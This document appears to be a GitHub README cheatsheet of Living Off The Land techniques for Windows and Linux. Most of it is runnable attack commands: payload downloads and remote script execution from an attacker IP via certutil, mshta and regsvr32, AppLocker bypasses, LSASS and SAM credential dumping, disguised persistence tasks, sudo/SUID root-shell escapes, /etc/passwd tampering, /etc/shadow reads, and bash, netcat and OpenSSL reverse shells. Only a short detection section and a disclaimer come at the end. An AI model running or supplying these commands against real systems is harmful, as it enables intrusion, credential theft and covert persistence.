# 🏹 Living Off The Land (LOLBAS & GTFOBins) - Complete Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)

```
  ██╗      ██████╗ ██╗     ██████╗  █████╗ ███████╗    ██████╗ ████████╗███████╗ ██████╗ 
  ██║     ██╔═══██╗██║     ██╔══██╗██╔══██╗██╔════╝   ██╔════╝ ╚══██╔══╝██╔════╝██╔═══██╗
  ██║     ██║   ██║██║     ██████╔╝███████║███████╗   ██║  ███╗   ██║   █████╗  ██║   ██║
  ██║     ██║   ██║██║     ██╔══██╗██╔══██║╚════██║   ██║   ██║   ██║   ██╔══╝  ██║   ██║
  ███████╗╚██████╔╝███████╗██████╔╝██║  ██║███████║██╗╚██████╔╝   ██║   ██║     ╚██████╔╝
  ╚══════╝ ╚═════╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝    ╚═╝   ╚═╝      ╚═════╝ 
                 Living Off The Land (Windows LOLBAS & Unix GTFOBins)
```

<p align="center">
  <img src="https://img.shields.io/badge/LOLBAS-Windows_Binaries-blue?style=for-the-badge" alt="LOLBAS">
  <img src="https://img.shields.io/badge/GTFOBins-Unix_PrivEsc-orange?style=for-the-badge" alt="GTFOBins">
  <img src="https://img.shields.io/badge/Defense_Evasion-Fileless-red?style=for-the-badge" alt="Defense Evasion">
  <img src="https://img.shields.io/badge/Living_Off_The_Land-Techniques-green?style=for-the-badge" alt="Living Off The Land">
</p>

<p align="center">
  <b>🛠️ Comprehensive reference for abusing legitimate pre-installed system binaries to execute code, download payloads, and escalate privileges</b>
</p>

---

## 📋 Table of Contents

- [Introduction](#-introduction)
- [Why Living Off The Land?](#-why-living-off-the-land)
- [Part 1: Windows LOLBAS](#-part-1-windows-lolbas)
  - [File Download & Ingress](#file-download--ingress)
  - [Code Execution & AppLocker Bypass](#code-execution--applocker-bypass)
  - [Credential Dumping (LSASS, SAM, LSA)](#credential-dumping-lsass-sam-lsa)
  - [Reconnaissance & Discovery](#reconnaissance--discovery)
  - [Persistence & Scheduled Tasks](#persistence--scheduled-tasks)
- [Part 2: Unix / Linux GTFOBins](#-part-2-unix--linux-gtfobins)
  - [SUID & Sudo Shell Escapes](#suid--sudo-shell-escapes)
  - [File Read & Write Exploitation](#file-read--write-exploitation)
  - [Network Ingress & Reverse Shells](#network-ingress--reverse-shells)
  - [GTFOBins High-Impact Interpreters](#gtfobins-high-impact-interpreters)
- [Quick Reference Table](#-quick-reference-table)
- [Defensive Considerations & Detection](#-defensive-considerations--detection)
- [Legal Disclaimer](#-legal-disclaimer)
- [Resources](#-resources)

---

## 🎯 Introduction

**Living Off The Land (LotL)** is a post-exploitation tradecraft where attackers and red teamers exclusively use legitimate, built-in, trusted system binaries, scripts, and libraries already present on the operating system.

- **LOLBAS (Windows):** Living Off The Land Binaries, Scripts, and Libraries.
- **GTFOBins (Unix/Linux):** Curated collection of Unix binaries that can be abused to bypass local security restrictions, escape restricted shells, and escalate privileges.

---

## ⚖️ Why Living Off The Land?

1. 🛡️ **Bypasses Application Whitelisting:** Binaries like `certutil.exe`, `rundll32.exe`, or `find` are digitally signed by Microsoft or OS vendors and trusted by AppLocker, WDAC, and SELinux.
2. 👁️ **Evades Signature-Based AV/EDR:** No foreign malicious executable (`.exe`, `.elf`) is dropped onto disk.
3. 📉 **Low Operational Footprint:** Reduces log forensic anomalies by utilizing native administration tools.

---

## 🪟 Part 1: Windows LOLBAS

### File Download & Ingress

#### 1. Certutil.exe
```cmd
:: Download file and decode from base64
certutil.exe -urlcache -split -f http://10.10.14.5/shell.exe %TEMP%\shell.exe

:: Base64 encode and decode local files
certutil.exe -encode payload.exe encoded.txt
certutil.exe -decode encoded.txt payload.exe
```

#### 2. Bitsadmin.exe
```cmd
:: Asynchronous background download
bitsadmin.exe /transfer myDownloadJob /download /priority FOREGROUND http://10.10.14.5/payload.exe C:\Windows\Temp\payload.exe
```

#### 3. Curl.exe & PowerShell
```powershell
:: Built-in curl (Windows 10+)
curl.exe -o C:\Windows\Temp\tool.exe http://10.10.14.5/tool.exe

:: PowerShell download string
powershell -nop -c "Invoke-WebRequest -Uri 'http://10.10.14.5/s.ps1' -OutFile '$env:TEMP\s.ps1'"
```

---

### Code Execution & AppLocker Bypass

#### 1. Mshta.exe (Execute Remote HTA/VBScript)
```cmd
:: Execute malicious HTA script directly from remote URL (bypasses AppLocker)
mshta.exe http://10.10.14.5/payload.hta

:: Inline VBScript execution
mshta.exe vbscript:Close(Execute("CreateObject(""WScript.Shell"").Run ""cmd.exe /c calc.exe"""))
```

#### 2. Regsvr32.exe (Squiblydoo Technique)
```cmd
:: Executes remote scriptlet (.sct) via COM without touching disk
regsvr32.exe /s /n /u /i:http://10.10.14.5/shell.sct scrobj.dll
```

#### 3. Rundll32.exe
```cmd
:: Execute exported DLL function
rundll32.exe payload.dll,EntryPoint

:: Execute JavaScript in memory
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('Pwned');
```

#### 4. Wmic.exe (XSL Script Execution)
```cmd
:: Execute arbitrary code via XSL stylesheet
wmic.exe process get brief /format:"http://10.10.14.5/script.xsl"
```

#### 5. Installutil.exe
```cmd
:: Execute unmanaged code inside signed .NET installer (bypasses AppLocker)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U MaliciousApp.exe
```

---

### Credential Dumping (LSASS, SAM, LSA)

#### 1. Rundll32.exe + Comsvcs.dll (LSASS Dump)
Dump LSASS process memory without dropping Mimikatz:
```powershell
# Find LSASS Process ID
$lsassPid = (Get-Process lsass).Id

# Create minidump using built-in comsvcs.dll (Requires Administrator)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid C:\Windows\Temp\lsass.dmp full
```

#### 2. Reg.exe (Save SAM, SYSTEM, and SECURITY Hives)
```cmd
:: Dump local credential hives for offline extraction
reg.exe save HKLM\SAM C:\Windows\Temp\sam.hive
reg.exe save HKLM\SYSTEM C:\Windows\Temp\system.hive
reg.exe save HKLM\SECURITY C:\Windows\Temp\security.hive
```

---

### Reconnaissance & Discovery

```cmd
:: Find internal domain controllers
nltest /dclist:domain.local

:: List domain trust relationships
nltest /domain_trusts

:: Query Active Directory computers and users without RSAT
dsquery computer
dsquery user -name *admin*

:: Check active network connections with process IDs
netstat -ano
```

---

### Persistence & Scheduled Tasks

```cmd
:: Create scheduled task running every 15 minutes as SYSTEM
schtasks.exe /create /tn "SecurityHealthService" /tr "C:\Windows\Temp\agent.exe" /sc minute /mo 15 /ru "NT AUTHORITY\SYSTEM"

:: Add Registry Run Key for current user
reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f
```

---

## 🐧 Part 2: Unix / Linux GTFOBins

### SUID & Sudo Shell Escapes

When a binary has SUID set (`chmod u+s`) or is granted in `sudo -l`, abuse it for an immediate root shell:

#### 1. Sudo / SUID `find`
```bash
# SUID
find . -exec /bin/sh -p \; -quit

# Sudo
sudo find . -exec /bin/sh \; -quit
```

#### 2. Sudo / SUID `vim` / `vi`
```bash
# Escape from inside vim
:!/bin/sh

# One-liner execution
vim -c ':!/bin/sh'
```

#### 3. Sudo / SUID `awk`
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

#### 4. Sudo / SUID `tar`
```bash
# Checkpoint command execution
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

#### 5. Sudo / SUID `nano`
```bash
# Inside nano: Press Ctrl+R, then Ctrl+X, then type:
reset; sh 1>&0 2>&0
```

#### 6. Sudo / SUID `env`
```bash
# SUID
env /bin/sh -p

# Sudo
sudo env /bin/sh
```

#### 7. Sudo `less` / `more` / `man`
```bash
# Inside pager: Type !/bin/sh and press Enter
!/bin/sh
```

---

### File Read & Write Exploitation

When you cannot spawn a shell directly, use file-read/write utilities to overwrite `/etc/passwd` or read `/etc/shadow`:

#### Overwrite `/etc/passwd` via Sudo/SUID `tee`
```bash
# Generate password hash: openssl passwd -1 -salt evil P@ss123
echo 'root2:$1$evil$TNy7V...:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd
su root2
```

#### Read Sensitive Files via SUID Binaries
```bash
# Base64
base64 /etc/shadow | base64 --decode

# Xxd
xxd /etc/shadow | xxd -r

# Head / Tail
head -n 100 /etc/shadow
```

---

### Network Ingress & Reverse Shells

Transfer files and pop shells without `curl` or `wget`:

#### 1. Bash Native TCP Reverse Shell
```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```

#### 2. Native Netcat (Without `-e` Flag)
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f
```

#### 3. OpenSSL Encrypted Reverse Shell
On attacker:
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```
On target:
```bash
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.14.5:4444 > /tmp/s; rm /tmp/s
```

---

### GTFOBins High-Impact Interpreters

If interpreters are granted Sudo / SUID:

```bash
# Python
sudo python3 -c 'import os; os.system("/bin/sh")'

# Perl
sudo perl -e 'exec "/bin/sh";'

# Ruby
sudo ruby -e 'exec "/bin/sh"'

# PHP
sudo php -r "system('/bin/sh');"

# Lua
sudo lua -e 'os.execute("/bin/sh")'
```

---

## 📊 Quick Reference Table

| OS | Binary | Purpose | Abuse Command |
|----|--------|---------|---------------|
| **Win** | `certutil.exe` | Download file | `certutil -urlcache -split -f http://<IP>/file out.exe` |
| **Win** | `mshta.exe` | Remote HTA Exec | `mshta http://<IP>/payload.hta` |
| **Win** | `regsvr32.exe` | Scriptlet Exec | `regsvr32 /s /n /u /i:http://<IP>/s.sct scrobj.dll` |
| **Win** | `rundll32.exe` | LSASS Dump | `rundll32 comsvcs.dll, MiniDump <PID> out.dmp full` |
| **Unix**| `find` | SUID Shell | `find . -exec /bin/sh -p \; -quit` |
| **Unix**| `awk` | Sudo Shell | `sudo awk 'BEGIN {system("/bin/sh")}'` |
| **Unix**| `vim` | Shell Escape | `vim -c ':!/bin/sh'` |
| **Unix**| `tee` | File Overwrite | `echo "root2:..." \| sudo tee -a /etc/passwd` |

---

## 🛡️ Defensive Considerations & Detection

1. **Audit Command-Line Logging:**
   Enable **Sysmon (Event ID 1)** and Windows Process Creation Logging (Event ID 4688) with command-line auditing to monitor anomalous arguments passed to `certutil`, `mshta`, and `rundll32`.
2. **Block Malicious Parent-Child Relationships:**
   Monitor `mshta.exe` or `regsvr32.exe` spawning `cmd.exe` or `powershell.exe`.
3. **Restrict Sudo Directives:**
   Avoid wildcards (`*`) in `/etc/sudoers`. Never allow users to run text editors (`vim`, `nano`) or compilers as root.

---

## ⚠️ Legal Disclaimer

> **IMPORTANT:** Living Off The Land techniques abuse trusted administrative utilities. This cheatsheet is strictly for authorized security assessments, defensive hardening, and educational study.

---

## 📚 Resources

- [LOLBAS Project Official Repository](https://lolbas-project.github.io/)
- [GTFOBins Official Repository](https://gtfobins.github.io/)
- [MITRE ATT&CK: Subverting Trust Controls (T1564)](https://attack.mitre.org/techniques/T1564/)
